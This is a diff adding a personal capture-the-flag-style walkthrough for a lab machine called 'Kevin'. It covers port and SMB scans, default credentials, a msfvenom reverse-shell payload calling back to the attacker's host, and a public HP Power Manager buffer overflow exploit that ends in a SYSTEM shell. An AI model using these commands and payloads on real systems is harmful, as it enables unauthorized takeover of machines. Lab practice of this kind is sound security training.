@@ -1,0 +1,107 @@
+																													Kevin walkthrough
+																													
+Attacker's Machine: 192.168.45.169
+Victim's Machine: 192.168.221.40
+export IP=192.168.221.40
+	
+nmap -Pn -p- -n -sCV  --min-rate 1000 $IP --stats-every=5s
+
+./nmapAutomator.sh -H $IP -t Full
+
+PORT      STATE SERVICE      VERSION
+80/tcp    open  http         GoAhead WebServer
+|_http-server-header: GoAhead-Webs
+| http-title: HP Power Manager
+|_Requested resource was http://192.168.221.45/index.asp
+135/tcp   open  msrpc        Microsoft Windows RPC
+139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds Windows 7 Ultimate N 7600 microsoft-ds (workgroup: WORKGROUP)
+3389/tcp  open  tcpwrapped
+|_ssl-date: 2023-08-23T12:29:03+00:00; 0s from scanner time.
+| rdp-ntlm-info: 
+|   Target_Name: KEVIN
+|   NetBIOS_Domain_Name: KEVIN
+|   NetBIOS_Computer_Name: KEVIN
+|   DNS_Domain_Name: kevin
+|   DNS_Computer_Name: kevin
+|   Product_Version: 6.1.7600
+|_  System_Time: 2023-08-23T12:28:48+00:00
+| ssl-cert: Subject: commonName=kevin
+| Not valid before: 2023-08-01T03:26:36
+|_Not valid after:  2024-01-31T03:26:36
+3573/tcp  open  tag-ups-1?
+49152/tcp open  msrpc        Microsoft Windows RPC
+49153/tcp open  msrpc        Microsoft Windows RPC
+49154/tcp open  msrpc        Microsoft Windows RPC
+49155/tcp open  msrpc        Microsoft Windows RPC
+49158/tcp open  msrpc        Microsoft Windows RPC
+49160/tcp open  msrpc        Microsoft Windows RPC
+Service Info: Host: KEVIN; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Enumeration 135,445 - SMB
+enum4linux -a $IP
+Looking up status of 192.168.221.45                                                                                                                                            
+        KEVIN           <00> -         B <ACTIVE>  Workstation Service
+        WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
+        WORKGROUP       <1e> - <GROUP> B <ACTIVE>  Browser Service Elections
+        KEVIN           <20> -         B <ACTIVE>  File Server Service
+        WORKGROUP       <1d> -         B <ACTIVE>  Master Browser
+        ..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser
+        
+nmap -p 139,445 --script=smb-vuln-* $IP
+PORT    STATE SERVICE
+139/tcp open  netbios-ssn
+445/tcp open  microsoft-ds
+
+Host script results:
+| smb-vuln-ms17-010: 
+|   VULNERABLE:
+|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
+|     State: VULNERABLE
+|     IDs:  CVE:CVE-2017-0143
+|     Risk factor: HIGH
+|       A critical remote code execution vulnerability exists in Microsoft SMBv1
+|        servers (ms17-010).
+
+
+# Search online for default credentials:
+Found: admin/admin
+
+# In the Help section of the app, we see that we are running HP Power Manager 4.2 (Build 7)
+
+searchsploit HP Power Manager
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                                                                                                                  |  Path
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Flying Dog Software Powerslave 4.3 Portalmanager - 'sql_id' Information Disclosure                                                                                             | php/webapps/23163.txt
+Hewlett-Packard (HP) Power Manager Administration - Remote Buffer Overflow (Metasploit)                                                                                   | windows/remote/16785.rb
+Hewlett-Packard (HP) Power Manager Administration Power Manager Administration - Universal Buffer Overflow                                                      | windows/remote/10099.py
+HP Power Manager - 'formExportDataLogs' Remote Buffer Overflow (Metasploit)                                                                                                    | cgi/remote/18015.rb
+
+https://dylanrholloway.com/proving-grounds-kevin-write-up/
+
+Attacker's Machine: 192.168.45.169
+Victim's Machine: 192.168.153.45
+export IP=192.168.153.45
+
+msfvenom -p windows/shell_reverse_tcp -b "\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c\x3d\x3b\x2d\x2c\x2e\x24\x25\x1a" LHOST=192.168.45.181 LPORT=80 -e x86/alpha_mixed -f c
+
+
+
+python2 10099.py 192.168.153.45
+HP Power Manager Administration Universal Buffer Overflow Exploit
+ryujin __A-T__ offensive-security.com
+[+] Sending evil buffer...
+HTTP/1.0 200 OK
+
+[+] Done!
+[*] Check your shell at 192.168.153.45:4444 , can take up to 1 min to spawn your shell
+
+rlwrap nc -lvnp 80  
+listening on [any] 80 ...
+connect to [192.168.45.181] from (UNKNOWN) [192.168.153.45] 49168
+Microsoft Windows [Version 6.1.7600]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Windows\system32>whoami
+nt authority\system
